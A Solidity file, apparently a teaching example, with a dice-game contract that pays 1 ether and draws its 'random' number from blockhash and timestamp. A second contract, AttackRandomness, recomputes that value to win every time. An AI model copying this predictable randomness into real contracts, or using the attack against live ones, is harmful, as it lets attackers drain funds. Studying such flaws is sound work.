// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Randomness {
    error Randomness_SentError();

    function encode(string memory _text) public pure returns (bytes memory) {
        return abi.encode(_text);
    }

    function encodePacked(
        string memory _text
    ) public pure returns (bytes memory) {
        return abi.encodePacked(_text);
    }

    function hashData(string memory _text) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(_text));
    }

    function getBlockhash() public view returns (bytes32) {
        return blockhash(block.number - 1);
    }

    function getBlockNumber() public view returns (uint) {
        return block.number;
    }

    function guessDice(uint8 _guessDice) public {
        uint8 dice = _random();
        if (dice == _guessDice) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");

            if (!sent) {
                revert Randomness_SentError();
            }
        }
    }

    function _random() private view returns (uint8) {
        uint256 blockValue = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        return uint8(blockValue % 5) + 1;
    }

    function getBlockValue() public view returns (uint) {
        uint256 blockValue = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        return blockValue;
    }

    function getRandom() public view returns (uint8) {
        return _random();
    }
}

contract AttackRandomness {
    Randomness private immutable i_randomness;

    constructor(address _target) {
        i_randomness = Randomness(_target);
    }

    receive() external payable {}

    function attackGuessDice() public {
        uint256 blockValue = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        uint8 _guessDice = uint8(blockValue % 5) + 1;
        i_randomness.guessDice(_guessDice);
    }
}
